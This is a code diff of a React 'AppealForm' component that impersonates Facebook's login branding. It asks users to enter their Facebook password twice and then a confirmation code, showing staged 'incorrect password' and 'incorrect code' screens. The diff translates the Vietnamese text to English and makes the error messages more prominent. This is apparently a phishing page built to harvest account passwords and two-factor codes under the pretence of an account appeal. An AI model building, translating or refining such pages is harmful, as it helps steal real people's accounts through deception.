@@ -491,25 +491,25 @@ export default function AppealForm() {
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
         
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Xác minh tài khoản</h1>
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Account Verification</h1>
         
         <p className="text-sm text-[#606770] mb-5 text-center">
-          Vui lòng nhập mật khẩu của tài khoản để xác minh danh tính trước khi xử lý kháng cáo.
+          Please enter your account password to verify your identity before processing the appeal.
         </p>
         
         <form onSubmit={handlePasswordSubmit1}>
           <div className="mb-5">
-            <label className="facebook-label">Mật khẩu Facebook</label>
+            <label className="facebook-label">Facebook Password</label>
             <input 
               type="password" 
               className={`facebook-input ${passwordError ? "border-red-500" : ""}`}
               value={password1}
               onChange={(e) => setPassword1(e.target.value)}
-              placeholder="Nhập mật khẩu của bạn"
+              placeholder="Enter your password"
               required
             />
             {passwordError && (
-              <p className="facebook-error-text">Mật khẩu không chính xác. Vui lòng nhập lại.</p>
+              <p className="facebook-error-text">Incorrect password. Please try again or request a password reset.</p>
             )}
           </div>
           
@@ -546,21 +546,21 @@ export default function AppealForm() {
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
         
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Thử lại mật khẩu</h1>
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Try again with password</h1>
         
-        <p className="text-sm text-[#606770] mb-5 text-center">
-          Mật khẩu không đúng. Vui lòng thử lại hoặc yêu cầu đặt lại mật khẩu.
+        <p className="text-sm text-[#FF0000] mb-5 text-center font-medium">
+          Incorrect password. Please try again or request a password reset.
         </p>
         
         <form onSubmit={handlePasswordSubmit2}>
           <div className="mb-5">
-            <label className="facebook-label">Mật khẩu Facebook</label>
+            <label className="facebook-label">Facebook Password</label>
             <input 
               type="password" 
               className="facebook-input"
               value={password2}
               onChange={(e) => setPassword2(e.target.value)}
-              placeholder="Nhập lại mật khẩu"
+              placeholder="Enter your password again"
               required
             />
           </div>
@@ -655,11 +655,10 @@ export default function AppealForm() {
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
         
-        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Thử lại mã xác nhận</h1>
+        <h1 className="text-xl font-bold text-[#1c1e21] mb-4 text-center">Try again with a code</h1>
         
-        <p className="text-sm text-[#606770] mb-5 text-center">
-          Mã xác nhận không đúng. Vui lòng thử lại mã xác nhận mới đã được gửi đến 
-          thiết bị của bạn.
+        <p className="text-sm text-[#FF0000] mb-5 text-center font-medium">
+          The code you entered is incorrect. Please try again with the new code sent to your device.
         </p>
         
         <form onSubmit={handleCodeSubmit2}>
